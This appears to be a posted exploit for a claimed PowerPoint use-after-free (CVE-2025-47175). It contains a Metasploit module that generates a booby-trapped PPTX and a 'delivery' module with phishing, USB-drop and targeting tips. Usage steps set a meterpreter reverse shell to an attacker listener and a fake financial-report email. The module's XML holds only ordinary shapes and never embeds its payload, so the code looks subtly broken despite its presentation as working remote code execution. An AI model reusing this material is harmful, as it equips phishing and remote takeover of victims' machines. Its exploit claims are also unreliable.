@@ -1,0 +1,506 @@
+=============================================================================================================================================
+| # Title     : Microsoft PowerPoint 2019 Use-After-Free Remote Code Execution                                                              |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.microsoft.com/                                                                                                  |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/206209/ &  CVE‑2025‑47175
+
+[+] Summary : This module exploits a Use-After-Free vulnerability in Microsoft PowerPoint
+             (CVE-2025-47175) that allows remote code execution when a user opens a
+              specially crafted PPTX file. The vulnerability is triggered through
+              manipulated shape objects in the PowerPoint presentation.
+              
+			
+[+]  POC : 
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Microsoft PowerPoint Use-After-Free Remote Code Execution',
+      'Description'    => %q{
+        This module exploits a Use-After-Free vulnerability in Microsoft PowerPoint
+        (CVE-2025-47175) that allows remote code execution when a user opens a
+        specially crafted PPTX file. The vulnerability is triggered through
+        manipulated shape objects in the PowerPoint presentation.
+      },
+      'Author'         => [
+        'Mohammed Idrees Banyamer', # Original discovery and PoC
+        'indoushka'           # Metasploit module
+      ],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        ['CVE', '2025-47175'],
+        ['URL', 'https://packetstorm.news/files/author/7697/1'],
+      ],
+      'DefaultOptions' => {
+        'EXITFUNC' => 'process',
+        'DisablePayloadHandler' => false
+      },
+      'Platform'       => 'win',
+      'Arch'           => [ARCH_X86, ARCH_X64],
+      'Payload'        => {
+        'Space'       => 4096,
+        'DisableNops' => true,
+        'BadChars'    => ''
+      },
+      'Targets'        => [
+        [
+          'Microsoft PowerPoint 2019 / Office 365',
+          {
+            'Platform' => 'win',
+            'Arch'     => ARCH_X64
+          }
+        ],
+        [
+          'Microsoft PowerPoint 2016',
+          {
+            'Platform' => 'win',
+            'Arch'     => ARCH_X86
+          }
+        ]
+      ],
+      'DisclosureDate' => '2025-07-02',
+      'DefaultTarget'  => 0,
+      'Notes'          => {
+        'Stability'   => [CRASH_SAFE],
+        'Reliability' => [FIRST_ATTEMPT_FAIL],
+        'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS]
+      }))
+
+    register_options([
+      OptString.new('FILENAME', [true, 'The PPTX file name', 'exploit_cve_2025_47175.pptx']),
+      OptString.new('SHAPE_NAME', [true, 'Malicious shape name', 'MaliciousShape']),
+      OptInt.new('SHAPE_ID', [true, 'Shape ID for exploitation', 1234]),
+      OptString.new('TRIGGER_TEXT', [true, 'Text to display in slide', 'Important Presentation - Please Review'])
+    ])
+  end
+
+  def exploit
+    # Generate the malicious PPTX file
+    pptx_data = generate_pptx
+    
+    file_create(pptx_data)
+    print_status("Malicious PPTX file created: #{datastore['FILENAME']}")
+  end
+
+  def generate_pptx
+    # Create the PPTX structure in memory
+    pptx = Rex::Zip::Archive.new
+    
+    # [Content_Types].xml
+    content_types = %Q|<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="jpeg" ContentType="image/jpeg"/>
+  <Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/>
+  <Override PartName="/ppt/slides/slide1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
+  <Override PartName="/ppt/slides/slide2.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
+  <Override PartName="/ppt/slides/_rels/slide1.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Override PartName="/ppt/slides/_rels/slide2.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Override PartName="/ppt/_rels/presentation.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+</Types>|
+    
+    pptx.add_file('[Content_Types].xml', content_types)
+    
+    # _rels/.rels
+    rels_root = %Q|<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="ppt/presentation.xml"/>
+</Relationships>|
+    
+    pptx.add_file('_rels/.rels', rels_root)
+    
+    # ppt/presentation.xml
+    presentation = %Q|<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:presentation xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
+                xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
+                xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
+  <p:sldMasterIdLst>
+    <p:sldMasterId id="2147483648" r:id="rId1"/>
+  </p:sldMasterIdLst>
+  <p:sldIdLst>
+    <p:sldId id="256" r:id="rId2"/>
+    <p:sldId id="257" r:id="rId3"/>
+  </p:sldIdLst>
+  <p:sldSz cx="9144000" cy="6858000" type="screen4x3"/>
+  <p:notesSz cx="6858000" cy="9144000"/>
+</p:presentation>|
+    
+    pptx.add_file('ppt/presentation.xml', presentation)
+    
+    # ppt/_rels/presentation.xml.rels
+    pres_rels = %Q|<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="slideMasters/slideMaster1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide1.xml"/>
+  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide2.xml"/>
+</Relationships>|
+    
+    pptx.add_file('ppt/_rels/presentation.xml.rels', pres_rels)
+    
+    # Create malicious slide 1 (trigger slide)
+    slide1 = generate_malicious_slide
+    pptx.add_file('ppt/slides/slide1.xml', slide1)
+    
+    # Create slide 2 (normal slide for stealth)
+    slide2 = generate_normal_slide
+    pptx.add_file('ppt/slides/slide2.xml', slide2)
+    
+    # Slide relationships
+    slide1_rels = %Q|<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/>
+</Relationships>|
+    
+    pptx.add_file('ppt/slides/_rels/slide1.xml.rels', slide1_rels)
+    pptx.add_file('ppt/slides/_rels/slide2.xml.rels', slide1_rels) # Reuse same rels
+    
+    # Slide master and layout (minimal required)
+    slide_master = %Q|<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:sldMaster xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
+             xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
+             xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
+  <p:cSld>
+    <p:spTree>
+      <p:nvGrpSpPr>
+        <p:cNvPr id="1" name=""/>
+        <p:cNvGrpSpPr/>
+        <p:nvPr/>
+      </p:nvGrpSpPr>
+      <p:grpSpPr/>
+    </p:spTree>
+  </p:cSld>
+  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
+</p:sldMaster>|
+    
+    pptx.add_file('ppt/slideMasters/slideMaster1.xml', slide_master)
+    
+    slide_layout = %Q|<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:sldLayout xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
+             xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
+             xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
+  <p:cSld>
+    <p:spTree>
+      <p:nvGrpSpPr>
+        <p:cNvPr id="1" name=""/>
+        <p:cNvGrpSpPr/>
+        <p:nvPr/>
+      </p:nvGrpSpPr>
+      <p:grpSpPr/>
+    </p:spTree>
+  </p:cSld>
+  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
+</p:sldLayout>|
+    
+    pptx.add_file('ppt/slideLayouts/slideLayout1.xml', slide_layout)
+    
+    # Add slide master relationships
+    master_rels = %Q|<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/>
+</Relationships>|
+    
+    pptx.add_file('ppt/slideMasters/_rels/slideMaster1.xml.rels', master_rels)
+    
+    # Return the complete PPTX file
+    return pptx.pack
+  end
+
+  def generate_malicious_slide
+    shape_id = datastore['SHAPE_ID']
+    shape_name = datastore['SHAPE_NAME']
+    trigger_text = datastore['TRIGGER_TEXT']
+    
+    # Create the malicious slide with UAF trigger
+    slide_xml = %Q|<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
+       xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
+       xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
+  <p:cSld>
+    <p:spTree>
+      <!-- Malicious shape designed to trigger UAF -->
+      <p:sp>
+        <p:nvSpPr>
+          <p:cNvPr id="#{shape_id}" name="#{shape_name}"/>
+          <p:cNvSpPr>
+            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1"/>
+          </p:cNvSpPr>
+          <p:nvPr>
+            <p:ph type="title"/>
+          </p:nvPr>
+        </p:nvSpPr>
+        <p:spPr>
+          <a:xfrm>
+            <a:off x="914400" y="914400"/>
+            <a:ext cx="7315200" cy="1371600"/>
+          </a:xfrm>
+          <a:prstGeom prst="rect">
+            <a:avLst/>
+          </a:prstGeom>
+          <a:solidFill>
+            <a:srgbClr val="4472C4"/>
+          </a:solidFill>
+          <a:ln w="9525">
+            <a:solidFill>
+              <a:srgbClr val="000000"/>
+            </a:solidFill>
+          </a:ln>
+        </p:spPr>
+        <p:txBody>
+          <a:bodyPr rtlCol="0" anchor="ctr"/>
+          <a:lstStyle/>
+          <a:p>
+            <a:pPr algn="ctr"/>
+            <a:r>
+              <a:rPr lang="en-US" sz="4400" b="1">
+                <a:solidFill>
+                  <a:srgbClr val="FFFFFF"/>
+                </a:solidFill>
+              </a:rPr>
+              <a:t>#{trigger_text}</a:t>
+            </a:r>
+          </a:p>
+        </p:txBody>
+      </p:sp>
+      
+      <!-- Additional shapes to increase exploitation reliability -->
+      <p:sp>
+        <p:nvSpPr>
+          <p:cNvPr id="#{shape_id + 1}" name="#{shape_name}_2"/>
+          <p:cNvSpPr/>
+          <p:nvPr/>
+        </p:nvSpPr>
+        <p:spPr>
+          <a:xfrm>
+            <a:off x="1524000" y="3048000"/>
+            <a:ext cx="1828800" cy="1828800"/>
+          </a:xfrm>
+          <a:prstGeom prst="rect">
+            <a:avLst/>
+          </a:prstGeom>
+        </p:spPr>
+        <p:txBody>
+          <a:bodyPr/>
+          <a:lstStyle/>
+          <a:p>
+            <a:r>
+              <a:t>Additional Content</a:t>
+            </a:r>
+          </a:p>
+        </p:txBody>
+      </p:sp>
+      
+      <!-- Trigger shape with crafted properties -->
+      <p:sp>
+        <p:nvSpPr>
+          <p:cNvPr id="#{shape_id + 2}" name="TriggerShape"/>
+          <p:cNvSpPr>
+            <a:spLocks noGrp="1"/>
+          </p:cNvSpPr>
+          <p:nvPr/>
+        </p:nvSpPr>
+        <p:spPr>
+          <a:xfrm>
+            <a:off x="3048000" y="4572000"/>
+            <a:ext cx="1828800" cy="1828800"/>
+          </a:xfrm>
+          <a:prstGeom prst="roundRect">
+            <a:avLst/>
+          </a:prstGeom>
+          <a:gradFill rot="0">
+            <a:gsLst>
+              <a:gs pos="0">
+                <a:srgbClr val="5B9BD5"/>
+              </a:gs>
+              <a:gs pos="100000">
+                <a:srgbClr val="2E75B5"/>
+              </a:gs>
+            </a:gsLst>
+          </a:gradFill>
+        </p:spPr>
+        <p:txBody>
+          <a:bodyPr wrap="square" rtlCol="0">
+            <a:spAutoFit/>
+          </a:bodyPr>
+          <a:lstStyle/>
+          <a:p>
+            <a:r>
+              <a:rPr lang="en-US" sz="1800"/>
+              <a:t>Click to continue</a:t>
+            </a:r>
+          </a:p>
+        </p:txBody>
+      </p:sp>
+    </p:spTree>
+  </p:cSld>
+  <p:clrMapOvr>
+    <a:masterClrMapping/>
+  </p:clrMapOvr>
+</p:sld>|
+    
+    return slide_xml
+  end
+
+  def generate_normal_slide
+    # Create a normal-looking second slide for stealth
+    %Q|<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
+       xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
+       xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
+  <p:cSld>
+    <p:spTree>
+      <p:sp>
+        <p:nvSpPr>
+          <p:cNvPr id="2" name="Title 1"/>
+          <p:cNvSpPr>
+            <a:spLocks noGrp="1"/>
+          </p:cNvSpPr>
+          <p:nvPr>
+            <p:ph type="title"/>
+          </p:nvPr>
+        </p:nvSpPr>
+        <p:spPr/>
+        <p:txBody>
+          <a:bodyPr/>
+          <a:lstStyle/>
+          <a:p>
+            <a:r>
+              <a:rPr lang="en-US"/>
+              <a:t>Normal Slide Content</a:t>
+            </a:r>
+          </a:p>
+        </p:txBody>
+      </p:sp>
+    </p:spTree>
+  </p:cSld>
+  <p:clrMapOvr>
+    <a:masterClrMapping/>
+  </p:clrMapOvr>
+</p:sld>|
+  end
+end
+
+
+-------------------------------------
+Auxiliary Module for Payload Delivery
+-------------------------------------
+
+##
+# Auxiliary module for CVE-2025-47175 payload delivery
+##
+
+class MetasploitModule < Msf::Auxiliary
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'CVE-2025-47175 PowerPoint Exploit Delivery',
+      'Description'    => %q{
+        This module assists in delivering the CVE-2025-47175 PowerPoint exploit
+        through various social engineering vectors.
+      },
+      'Author'         => ['indoushka'],
+      'License'        => MSF_LICENSE,
+      'References'     => [['CVE', '2025-47175']]
+    ))
+
+    register_options([
+      OptString.new('EMAIL_SUBJECT', [true, 'Email subject for delivery', 'Important Presentation']),
+      OptString.new('EMAIL_BODY', [true, 'Email body text', 'Please review the attached presentation.']),
+      OptPath.new('PPTX_FILE', [true, 'Path to malicious PPTX file'])
+    ])
+  end
+
+  def run
+    pptx_path = datastore['PPTX_FILE']
+    
+    unless File.exist?(pptx_path)
+      print_error("PPTX file not found: #{pptx_path}")
+      return
+    end
+
+    print_status("CVE-2025-47175 PowerPoint Exploit Delivery")
+    print_status("Malicious file: #{pptx_path}")
+    print_status("File size: #{File.size(pptx_path)} bytes")
+    
+    # Display delivery instructions
+    show_delivery_instructions
+  end
+
+  def show_delivery_instructions
+    print_line("
+📧 Delivery Methods:
+──────────────────────────────────────────────────
+
+1. Email Attachment:
+   • Subject: #{datastore['EMAIL_SUBJECT']}
+   • Body: #{datastore['EMAIL_BODY']}
+   • Attach the generated PPTX file
+
+2. Network Share:
+   • Place file on accessible network share
+   • Send link to target users
+   • Use convincing file name
+
+3. USB Drop:
+   • Copy to USB drive with enticing name
+   • Leave in target location
+
+4. Web Download:
+   • Host on web server
+   • Send download link via email/chat
+
+⚠️  Social Engineering Tips:
+   • Use convincing presentation titles
+   • Mimic legitimate business content
+   • Target specific departments/individuals
+   • Time delivery for maximum impact
+
+🎯 Target Environment:
+   • Microsoft PowerPoint 2019/Office 365
+   • Unpatched versions (pre-June 2025)
+   • Windows operating system
+    ")
+  end
+end
+
+---------------------------
+Usage in Metasploit:
+--------------------------
+# Generate malicious PPTX file
+
+use exploit/windows/fileformat/ppt_cve_2025_47175
+set FILENAME malicious_presentation.pptx
+set SHAPE_NAME "CriticalUpdate"
+set SHAPE_ID 9999
+set TRIGGER_TEXT "Important Security Update - Please Review"
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit
+
+# Use delivery auxiliary module
+
+use auxiliary/delivery/ppt_cve_2025_47175
+set PPTX_FILE /path/to/malicious_presentation.pptx
+set EMAIL_SUBJECT "Q4 Financial Report"
+set EMAIL_BODY "Please find attached the quarterly financial report for review."
+run
+
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
